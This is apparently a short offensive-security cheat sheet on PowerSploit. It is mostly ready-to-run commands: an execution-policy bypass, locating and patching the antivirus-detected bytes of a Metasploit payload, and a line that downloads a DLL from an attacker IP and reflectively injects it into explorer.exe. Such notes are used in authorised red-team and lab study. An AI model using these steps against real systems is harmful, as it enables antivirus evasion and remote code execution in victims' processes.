# PowerSploit

## PowerSploit

#### Installation

```csharp
git clone https://github.com/PowerShellMafia/PowerSploit
```

### Find-AVSignature

```csharp
powershell -exec bypass
. .\Find-AVSignature.ps1 

 Find-AVSignature -StartByte 180000 -EndByte 190000 -Interval 1000 -Path C:\temp\msfnonstaged.exe -OutPath C:\temp\msfnonstaged -Force -Verbose
```

![](../../.gitbook/assets/image%20%28138%29.png)

#### Change the detected bytes section

```csharp
$byte = [System.IO.File]::ReadAllBytes("C:\users\b3v1l\\msfnonstaged.exe") 
$byte[175830] = 0 // or 0xFF
[System.IO.File]::WriteAllBytes("C:\users\b3v1l\msf_modif.exe", $byte)
```

### DLL Reflection Injection

```csharp
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://10.110.0.66/nice.dll')
 (Get-Process -Name "explorer").Id
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

{% hint style="info" %}
Error message can be ignored
{% endhint %}

![](../../.gitbook/assets/image%20%28189%29.png)

### Resources

{% embed url="https://github.com/PowerShellMafia/PowerSploit" %}

